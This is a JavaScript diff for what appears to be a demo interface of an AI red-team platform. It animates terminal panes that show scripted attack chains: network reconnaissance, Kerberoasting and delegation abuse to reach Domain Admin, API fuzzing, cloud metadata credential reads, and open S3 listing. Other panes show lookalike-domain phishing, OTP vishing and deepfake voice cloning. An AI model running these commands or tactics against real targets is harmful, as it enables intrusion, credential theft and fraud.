@@ -1006,19 +1006,32 @@
   function runCampaign() {
     var t = TYPES.filter(function (x) { return x.k === wiz.type; })[0];
     var cid = "CMP-" + (2045 + state.campaigns.length);
-    var phases = wiz.type === "social"
-      ? [["Roster sync", "consented targets loaded"], ["Pretext build", "narrative generated"], ["Email wave", "lures dispatched"], ["Multichannel", "SMS, voice, deepfake escalation"], ["Engagement scoring", "click, report, credential"], ["Report", "human risk index sealed"]]
+    var social = wiz.type === "social";
+    var phases = social
+      ? [["Roster sync", "consented targets loaded"], ["Pretext build", "narrative generated"], ["Channel send", "lures dispatched"], ["Narrative replan", "escalation arbitrated"], ["Engagement scoring", "click, report, credential"], ["Report", "human risk index sealed"]]
       : [["Reconnaissance", "mapping connected scope"], ["Enumeration", "services and identities"], ["Exploitation", "candidate vulnerabilities"], ["Validation", "deterministic sandbox replay"], ["Lateral movement", "pivot across the stack"], ["Privilege escalation", "path to crown jewels"], ["Impact and exfil sim", "prove reach, no loss"], ["Compliance and report", "map and seal evidence"]];
+
+    var PANES = social ? socialPanes() : technicalPanes();
+
     var ops = $("#ops");
     ops.innerHTML =
       '<div class="ops-top"><span class="ot-id">' + cid + '</span><h3>' + t.n + '</h3>' +
       '<span class="live">LIVE ENGAGEMENT</span><div class="topbar-spacer"></div>' +
       '<span class="clock" id="opClock">00:00</span><button class="btn-mini ghost sm" id="opStop">Stop safely</button></div>' +
       '<div class="ops-grid"><div class="ops-col"><div class="ops-h">Engagement phases</div><div id="opPhases"></div></div>' +
-      '<div class="ops-col mid"><div class="ops-h">Agent telemetry</div><div class="term" id="opTerm"></div></div>' +
+      '<div class="ops-col mid">' +
+        '<div class="term-grid">' +
+        PANES.map(function (p, i) {
+          return '<div class="term-pane" id="pane' + i + '"><div class="tp-head"><span class="dotp run"></span><b>' + p.title + '</b><span class="tp-host mono">' + p.host + '</span></div>' +
+            '<div class="tp-body" id="tp' + i + '"><div class="tl pf">' + (i === 0 ? "Last login: Tue May 19 09:11:38 2026 from 10.4.0.2" : "Last login: Tue May 19 09:11:38 2026 from 10.4.0.2") + '</div><span class="cursor" id="cur' + i + '"></span></div>' +
+            '<div class="tp-status mono"><span>' + p.title + '</span><span class="tps-host">' + p.host.split(" //")[0] + '</span><span class="tps-t" id="tps' + i + '">--:--</span></div></div>';
+        }).join("") +
+        '</div>' +
+      '</div>' +
       '<div class="ops-col"><div class="ops-h">Live metrics</div>' +
       '<div class="ops-metric"><div class="ml">Agents active</div><div class="mv" id="opAgents">0</div></div>' +
       '<div class="ops-metric"><div class="ml">Hosts touched</div><div class="mv" id="opHosts">0</div></div>' +
+      '<div class="ops-metric"><div class="ml">Tool calls</div><div class="mv" id="opCalls">0</div></div>' +
       '<div class="ops-metric"><div class="ml">Findings proven</div><div class="mv" id="opFind">0</div></div>' +
       '<div class="ops-h" style="margin-top:8px">New findings</div><div id="opFindList"></div></div></div>' +
       '<div class="ops-foot"><span class="ot-id">PROGRESS</span><div class="bar"><i id="opBar" style="width:0%"></i></div><span class="pct" id="opPct">0%</span></div>';
@@ -1027,65 +1040,80 @@
       return '<div class="phase idle" id="ph' + i + '"><div class="pi">' + (i + 1) + '</div><div><div class="pn">' + p[0] + '</div><div class="pd">' + p[1] + '</div></div></div>';
     }).join("");
 
-    var newFindings = wiz.type === "social" ? [] : pickFindings(wiz.type);
-    var term = $("#opTerm"), t0 = Date.now(), stopped = false;
+    var newFindings = social ? [] : pickFindings(wiz.type);
+    var t0 = Date.now(), stopped = false;
     var clockIv = setInterval(function () {
       var s = Math.floor((Date.now() - t0) / 1000);
       $("#opClock").textContent = String(Math.floor(s / 60)).padStart(2, "0") + ":" + String(s % 60).padStart(2, "0");
     }, 1000);
-    function log(cls, txt) {
-      var d = document.createElement("div");
-      var ts = new Date().toLocaleTimeString([], { hour12: false });
-      d.className = cls || "";
-      d.innerHTML = '<span class="ts">' + ts + '</span> ' + txt;
-      term.appendChild(d); term.scrollTop = term.scrollHeight;
-      while (term.children.length > 220) term.removeChild(term.firstChild);
+
+    var paneIdx = PANES.map(function () { return 0; });
+    var total = PANES.reduce(function (a, p) { return a + p.lines.length; }, 0);
+    var shown = 0, agents = 0, hosts = 0, calls = 0, found = 0, fidx = 0;
+    var ord = [0, 2, 1, 3, 0, 1, 2, 3]; // gentle weighting so recon and web/cloud lead slightly
+    var oi = 0;
+    var findingMilestones = [Math.floor(total * 0.32), Math.floor(total * 0.58), Math.floor(total * 0.82)];
+
+    var stepT = null;
+    function nextDelay(line) {
+      if (/class=.cm/.test(line)) return 360 + Math.random() * 240; // typing a command, slower
+      if (/class=.ok|class=.warn|class=.err/.test(line)) return 230 + Math.random() * 220;
+      return 130 + Math.random() * 180; // output streams faster
     }
-    var agents = 0, hosts = 0, found = 0, pi = 0, fidx = 0;
-    var lines = [
-      ['<span class="ag">agent.recon</span> sweeping scope, ' + (wiz.params.concurrency) + ' agents dispatched'],
-      ['<span class="ag">agent.recon</span> 1,284 assets fingerprinted'],
-      ['<span class="ag">agent.network</span> service enumeration on internal subnet'],
-      ['<span class="ag">agent.cloud</span> auditing IAM roles and bucket policies'],
-      ['<span class="ag">agent.identity</span> probing Kerberos and delegation'],
-      ['<span class="ag">agent.web</span> fuzzing settlement state machine'],
-      ['<span class="gd">validator</span> reproducing candidate in isolated sandbox'],
-      ['<span class="ag">agent.identity</span> credential recovered, pivoting'],
-      ['<span class="ag">agent.lateral</span> moved into 10.4.12.0/24'],
-      ['<span class="cr">agent.privesc</span> unconstrained delegation, Domain Admin in reach'],
-      ['<span class="gd">compliance.map</span> tagging finding to NIST and Cyber Trust'],
-      ['<span class="ag">agent.exfil</span> reach proven, no data removed, standing down']
-    ];
-    var step = setInterval(function () {
+    function tick() {
       if (stopped) return;
-      for (var b = 0; b < 2; b++) log("", lines[(pi + b) % lines.length][0]);
-      agents = Math.min(wiz.params.concurrency, agents + Math.ceil(Math.random() * 14));
-      hosts += Math.ceil(Math.random() * 9);
-      $("#opAgents").textContent = agents; $("#opHosts").textContent = hosts;
-      var phn = Math.floor((pi / lines.length) * phases.length);
-      for (var k = 0; k <= phn && k < phases.length; k++) {
-        var pe = $("#ph" + k); pe.className = "phase " + (k < phn ? "done" : "run");
-        pe.querySelector(".pi").innerHTML = k < phn ? "&#10003;" : (k + 1);
+      var tries = 0, k;
+      do { k = ord[oi % ord.length]; oi++; tries++; if (tries > 16) break; }
+      while (paneIdx[k] >= PANES[k].lines.length);
+      if (paneIdx[k] >= PANES[k].lines.length) { finish(); return; }
+      var line = PANES[k].lines[paneIdx[k]++];
+      var box = $("#tp" + k), cur = $("#cur" + k);
+      var d = document.createElement("div");
+      d.className = "tl";
+      d.innerHTML = line;
+      if (cur) box.insertBefore(d, cur); else box.appendChild(d);
+      box.scrollTop = box.scrollHeight;
+      while (box.children.length > 60 && box.firstChild !== cur) box.removeChild(box.firstChild);
+      $$(".term-pane").forEach(function (n, idx) { n.classList.toggle("active", idx === k); });
+      var tps = $("#tps" + k); if (tps) tps.textContent = new Date().toLocaleTimeString([], { hour12: false });
+      shown++;
+      if (/class=.cm/.test(line)) calls++;
+      if (/class=.warn|class=.ok/.test(line)) hosts += 1 + Math.floor(Math.random() * 3);
+      agents = Math.min(wiz.params && wiz.params.concurrency || 80, agents + (Math.random() < .4 ? 1 : 0));
+      hosts += Math.random() < .5 ? 0 : 1;
+      $("#opAgents").textContent = agents;
+      $("#opHosts").textContent = hosts;
+      $("#opCalls").textContent = calls;
+
+      var phn = Math.min(phases.length - 1, Math.floor((shown / total) * phases.length));
+      for (var p = 0; p <= phn; p++) {
+        var pe = $("#ph" + p);
+        if (!pe) continue;
+        pe.className = "phase " + (p < phn ? "done" : "run");
+        pe.querySelector(".pi").innerHTML = p < phn ? "&#10003;" : (p + 1);
       }
-      if (pi === 4 || pi === 7 || pi === 9) {
+
+      if (findingMilestones.length && shown >= findingMilestones[0]) {
+        findingMilestones.shift();
         if (fidx < newFindings.length) {
           var nf = newFindings[fidx++]; found++; $("#opFind").textContent = found;
-          log("ok", '<span class="ok">[proven]</span> ' + nf.id + ' ' + esc(nf.t));
-          var box = $("#opFindList"), el = document.createElement("div");
+          var box2 = $("#opFindList"), el = document.createElement("div");
           el.className = "mini-find";
           el.innerHTML = '<div class="mf-t"><span class="mf-id">' + nf.id + '</span>' + sevTag(nf.sev) + '</div>' + esc(nf.t);
-          box.insertBefore(el, box.firstChild);
+          box2.insertBefore(el, box2.firstChild);
         }
       }
-      var pct = Math.min(100, Math.round(((pi + 1) / lines.length) * 100));
+
+      var pct = Math.min(100, Math.round((shown / total) * 100));
       $("#opBar").style.width = pct + "%"; $("#opPct").textContent = pct + "%";
-      pi++;
-      if (pi >= lines.length) { clearInterval(step); finish(); }
-    }, 850);
+      if (shown >= total) { finish(); return; }
+      stepT = setTimeout(tick, nextDelay(line));
+    }
+    stepT = setTimeout(tick, 220);
 
     function finish() {
       $$(".phase").forEach(function (p) { p.className = "phase done"; p.querySelector(".pi").innerHTML = "&#10003;"; });
-      log("ok", '<span class="ok">[complete]</span> engagement finished, evidence pack sealed');
+      $$(".tp-head .dotp").forEach(function (n) { n.className = "dotp ok"; });
       clearInterval(clockIv);
       var crit = newFindings.filter(function (f) { return f.sev === "Critical"; }).length;
       var high = newFindings.filter(function (f) { return f.sev === "High"; }).length;
@@ -1099,11 +1127,190 @@
       $("#opReport").onclick = function () { ops.classList.remove("open"); location.hash = "#/campaign/" + cid; toast("Campaign complete", cid + ": " + crit + " critical, " + high + " high, all proven and mapped."); };
     }
     $("#opStop").onclick = function () {
-      stopped = true; clearInterval(step); clearInterval(clockIv);
-      log("cr", '<span class="cr">[stopped]</span> operator halt, standing down safely');
+      stopped = true; if (stepT) clearTimeout(stepT); clearInterval(clockIv);
+      var tb = $("#tp3"), cur = $("#cur3"); if (tb) { var d = document.createElement("div"); d.className = "tl"; d.innerHTML = '<span class="err">[!] operator halt received, standing down safely</span>'; if (cur) tb.insertBefore(d, cur); else tb.appendChild(d); tb.scrollTop = tb.scrollHeight; }
       setTimeout(finish, 600);
     };
   }
+
+  function technicalPanes() {
+    var P = function (prm, cm) { return '<span class="prm">' + prm + '</span> <span class="cm">' + cm + '</span>'; };
+    var OK = function (s) { return '<span class="ok">' + s + '</span>'; };
+    var W = function (s) { return '<span class="warn">' + s + '</span>'; };
+    var I = function (s) { return '<span class="info">' + s + '</span>'; };
+    var O = function (s) { return '<span class="ot">' + s + '</span>'; };
+    return [
+      { title: "agent.recon", host: "cb-recon-04 // 10.4.0.0/16",
+        lines: [
+          P("operator@cb-recon:~$", "id; uname -srm"),
+          O("uid=1000(operator) gid=1000(operator) groups=1000(operator)"),
+          O("Linux cb-recon-04 6.6.30-cb #1 SMP x86_64 GNU/Linux"),
+          P("operator@cb-recon:~$", "nmap -sV -p- 10.4.0.0/16 --open --min-rate 1500 -oA /loot/recon/int"),
+          I("Starting Nmap 7.94 ( https://nmap.org )"),
+          O("Nmap scan report for nw-corp-dc01.nw-corp.local (10.4.0.10)"),
+          O("PORT     STATE SERVICE   VERSION"),
+          O("53/tcp   open  domain    Microsoft DNS"),
+          O("88/tcp   open  kerberos  Microsoft Windows Kerberos"),
+          O("389/tcp  open  ldap      Active Directory LDAP"),
+          O("445/tcp  open  smb       Microsoft Windows SMB"),
+          O("636/tcp  open  ldaps     Active Directory LDAP (SSL)"),
+          O("Nmap done: 65536 IP addresses (412 hosts up) in 41.2s"),
+          P("operator@cb-recon:~$", "amass enum -d northwind.io -active -dir /loot/recon"),
+          O("www.northwind.io"), O("api-gw.northwind.io"), O("vpn.northwind.io"),
+          O("payments.northwind.io"), O("jenkins.int.northwind.io"),
+          OK("[+] 142 names enumerated, 38 unique IPs"),
+          P("operator@cb-recon:~$", "dig +short ANY northwind.io @8.8.8.8 | head"),
+          O("a.ns.northwind.io."), O("b.ns.northwind.io."), O("v=spf1 include:_spf.google.com ~all"),
+          OK("[+] surface map handed to planner")
+        ] },
+      { title: "agent.identity", host: "cb-id-02 // nw-corp.local",
+        lines: [
+          P("operator@cb-id:~$", "kerbrute userenum -d nw-corp.local --dc 10.4.0.10 wordlists/employees.txt"),
+          I("[+] kerbrute v1.0.3 starting against nw-corp.local"),
+          O("[+] VALID USERNAME: svc_ci@nw-corp.local"),
+          O("[+] VALID USERNAME: aaron.ang@nw-corp.local"),
+          O("[+] VALID USERNAME: marcus.tan@nw-corp.local"),
+          O("[+] Found 412 valid usernames"),
+          P("operator@cb-id:~$", "GetUserSPNs.py nw-corp.local/svc_ci:'[REDACTED]' -dc-ip 10.4.0.10 -request"),
+          O("ServicePrincipalName                Name      MemberOf"),
+          O("HTTP/jenkins.int.northwind.io       svc_ci    Domain Users"),
+          O("$krb5tgs$23$*svc_ci$NW-CORP.LOCAL$HTTP/jenkins..."),
+          OK("[+] TGS-REP roastable hash captured"),
+          P("operator@cb-id:~$", "bloodhound-python -u svc_ci -p '[REDACTED]' -d nw-corp.local -c All -ns 10.4.0.10"),
+          I("INFO: Connecting to LDAP server: nw-corp-dc01.nw-corp.local"),
+          O("INFO: Found 412 users, 39 groups, 124 computers, 6 trusts"),
+          O("INFO: Compressing collected data to 20260519_bh.zip"),
+          P("operator@cb-id:~$", "cypher-shell -u neo4j -p '****' -f /loot/identity/da-path.cyp"),
+          W("[!] Path: svc_ci -[GenericAll]-> svcDelegate -[AllowedToDelegate]-> dc1"),
+          W("[!] svcDelegate has TrustedToAuthForDelegation (S4U2Self abuse)"),
+          P("operator@cb-id:~$", "getST.py -spn HTTP/dc1.nw-corp.local -impersonate Administrator nw-corp.local/svc_ci:'[REDACTED]'"),
+          I("[*] Getting TGT for user"),
+          I("[*] Impersonating Administrator via unconstrained delegation"),
+          OK("[+] Got TGT for Administrator. Validated in sandbox.")
+        ] },
+      { title: "agent.web + cloud", host: "cb-web-07 // payments + aws nw-prod",
+        lines: [
+          P("operator@cb-web:~$", "ffuf -u https://payments.northwind.io/api/v2/FUZZ -w api.txt -mc 200,401,403 -t 60 -rate 80"),
+          O("       /'___\\  /'___\\           /'___\\"),
+          O("      /\\ \\__/ /\\ \\__/  __  __ /\\ \\__/"),
+          I("[Status: 200, Size: 312] settle"),
+          I("[Status: 200, Size: 218] balance"),
+          I("[Status: 401, Size: 88]  admin"),
+          O(":: Progress: [3812/3812] :: 73 req/sec"),
+          P("operator@cb-web:~$", "curl -s -X POST https://payments.northwind.io/api/v2/settle -H 'Authorization: Bearer eyJ...' -d '{\"amount\":-50000,\"acct\":\"sandbox-c4f1\"}'"),
+          O('{"ok":true,"delta":-50000,"ref":"S-2026-0519-7711"}'),
+          W("[!] Business logic flaw: negative amount accepted, no second step"),
+          P("operator@cb-web:~$", "aws --profile nw-prod sts get-caller-identity"),
+          O("{"),
+          O("  \"Arn\": \"arn:aws:sts::934217...:assumed-role/nw-eks-node-role/i-0aa9...\""),
+          O("}"),
+          P("operator@cb-web:~$", "kubectl --context nw-prod-eks exec -n payments payments-7f4-2x9k -- curl -s 169.254.169.254/latest/meta-data/iam/security-credentials/"),
+          W("nw-eks-node-role"),
+          P("operator@cb-web:~$", "aws s3 ls s3://nw-statements --no-sign-request | head"),
+          O("2026-04 statement_8841.pdf"),
+          O("2026-04 statement_8842.pdf"),
+          O("2026-04 statement_8843.pdf"),
+          W("[!] Bucket policy permits anonymous list (41,200 objects)"),
+          P("operator@cb-web:~$", "scout aws -p nw-prod --no-browser"),
+          OK("[+] cloud audit complete: 6 high, 12 medium configurations")
+        ] },
+      { title: "validator + planner", host: "cb-validator // isolated sandbox",
+        lines: [
+          P("planner@cb:~$", "plan show --campaign " + cid),
+          O("goal: reach customer statement store"),
+          O("  └ subgoal: foothold on supply chain edge   [done]"),
+          O("  └ subgoal: recover and reuse credential    [done]"),
+          O("  └ subgoal: lateral to identity subnet      [run]"),
+          O("  └ subgoal: escalate to Domain Admin        [run]"),
+          O("  └ subgoal: prove impact, then stop         [queued]"),
+          P("validator@sandbox:~$", "replay --finding F-3303 --tenant payments-sandbox-c4f1"),
+          I("[*] Spinning isolated tenant payments-sandbox-c4f1"),
+          I("[*] Applying capture from agent.web"),
+          O("HTTP/1.1 200 OK  body={\"ok\":true,\"delta\":-50000}"),
+          OK("[+] Ledger delta reproduced (1/3)"),
+          OK("[+] Ledger delta reproduced (2/3)"),
+          OK("[+] Ledger delta reproduced (3/3)"),
+          P("validator@sandbox:~$", "replay --finding F-3301 --no-network --safe"),
+          I("[*] Constructing service ticket in isolated AD"),
+          OK("[+] Domain Admin TGT validated (3/3)"),
+          P("validator@sandbox:~$", "replay --finding F-3302 --read-only --sample 5"),
+          O("s3://nw-statements/statement_8841.pdf [200 OK, 41 KB]"),
+          OK("[+] Read proven on sampled objects. No data removed."),
+          P("validator@sandbox:~$", "map --frameworks NIST,CyberTrust,ISO,MITRE"),
+          OK("[+] NIST PR.AC-1, Cyber Trust A.5, ISO A.5.15, ATT&amp;CK T1078"),
+          P("validator@sandbox:~$", "seal --chain-of-custody --sign hsm"),
+          OK("[+] Evidence pack sealed. Campaign closing.")
+        ] }
+    ];
+  }
+
+  function socialPanes() {
+    var P = function (prm, cm) { return '<span class="prm">' + prm + '</span> <span class="cm">' + cm + '</span>'; };
+    var OK = function (s) { return '<span class="ok">' + s + '</span>'; };
+    var W = function (s) { return '<span class="warn">' + s + '</span>'; };
+    var I = function (s) { return '<span class="info">' + s + '</span>'; };
+    var O = function (s) { return '<span class="ot">' + s + '</span>'; };
+    return [
+      { title: "pretext.engine", host: "cb-pretext-01",
+        lines: [
+          P("operator@cb-pretext:~$", "pretext build --theme finance.urgent_payment --tone assertive --osint northwind.io"),
+          I("[+] Loaded vendor and signing pattern signals from northwind.io"),
+          O("sender.display = Northwind Accounts Payable"),
+          O("sender.address = accounts.payable@northwlnd-finance.com (lookalike)"),
+          O("subject        = Action required: payment release held for approval"),
+          O("body.tone      = urgent, vendor service interruption"),
+          O("landing        = m365-sso (capture page, never stores credentials)"),
+          OK("[+] lure passed guardrail review, no real loss path"),
+          P("operator@cb-pretext:~$", "pretext variants --n 4 --persona cfo,ceo,vendor"),
+          OK("[+] 4 variants generated for A/B"),
+          P("operator@cb-pretext:~$", "approve --by 'Aaron Ang' --auth AUTH-2026-0519-NW"),
+          OK("[+] approved, queued for channel.send")
+        ] },
+      { title: "channel.send", host: "cb-channels // mail + sms + im",
+        lines: [
+          P("operator@cb-ch:~$", "channel send --emails roster/finance.csv --rate 40/h --window 0930-1700"),
+          I("[+] 118 recipients queued (Finance roster)"),
+          O("[09:31:02] DELIVERED priya.n@northwind.io"),
+          O("[09:31:14] OPENED    priya.n@northwind.io"),
+          O("[09:31:41] CLICKED   priya.n@northwind.io"),
+          W("[!] CREDENTIAL ENTERED priya.n (capture page, not stored)"),
+          O("[09:32:08] REPORTED  marcus.tan@northwind.io"),
+          O("[09:32:30] DELIVERED 24 SMS via Twilio"),
+          O("[09:33:11] WHATSAPP  delivered to 12 numbers"),
+          O("[09:33:50] SLACK     posted to #finance-help"),
+          OK("[+] 118 emails delivered, 24 SMS, 12 WhatsApp, 3 Slack"),
+          OK("[+] coaching policy will fire for engaged learners")
+        ] },
+      { title: "narrative.engine", host: "cb-narrative",
+        lines: [
+          P("operator@cb-nar:~$", "narrative watch --campaign " + cid + " --replan on-engage"),
+          I("[*] state.priya.n: stage=email.open"),
+          O("decision -> escalate to vishing call"),
+          I("[*] state.priya.n: stage=vishing.call.connected"),
+          O("decision -> request OTP for portal release"),
+          W("[!] target hesitated 4.2s after OTP request, lowering pressure"),
+          OK("[+] target reported to security, standing down on this thread"),
+          I("[*] replan: switch persona to vendor support, target finance.ap.team"),
+          O("decision -> queue deepfake call to verify wire change"),
+          OK("[+] narrative continuity preserved across channels")
+        ] },
+      { title: "media.synth", host: "cb-synth // voice + face",
+        lines: [
+          P("operator@cb-synth:~$", "voice clone --persona 'Marcus T. (consented)' --watermark cb-wm-9311"),
+          I("[*] loading 8.4 min of consented samples"),
+          O("model = rvc-v2  voice-id = nw-marcus-9311"),
+          O("naturalness 4.6/5  watermark embedded in every chunk"),
+          OK("[+] persona ready for vishing"),
+          P("operator@cb-synth:~$", "face synth --persona 'Lena Tan (CFO, consented)' --camera virtual-cb"),
+          I("[*] loading consented likeness, frame watermark on"),
+          O("virtual camera attached: cb-cam-7"),
+          O("audio device attached:   cb-aud-3"),
+          OK("[+] live deepfake persona ready, watermark on every frame"),
+          OK("[+] all assets logged, post-engagement reveal queued")
+        ] }
+    ];
+  }
+
   function pickFindings(type) {
     var base = [
       { id: "F-34" + rnd(), t: "Over scoped CI token enables cross namespace write", sev: "Critical", surf: "Supply chain", att: "T1078 / T1552", cvss: 8.7, cmp: "", d: "A long lived CI token discovered during this campaign grants write access across three production namespaces.", poc: "$ curl -H 'Authorization: Bearer <span class='gd'>[recovered]</span>' ...\n<span class='ok'>[+] Cross namespace write proven in sandbox.</span>", fix: "Short lived OIDC tokens scoped per pipeline, rotate and alert on reuse.", fw: ["NIST PR.AC-4", "CIS 16", "ATT&CK T1552"] },
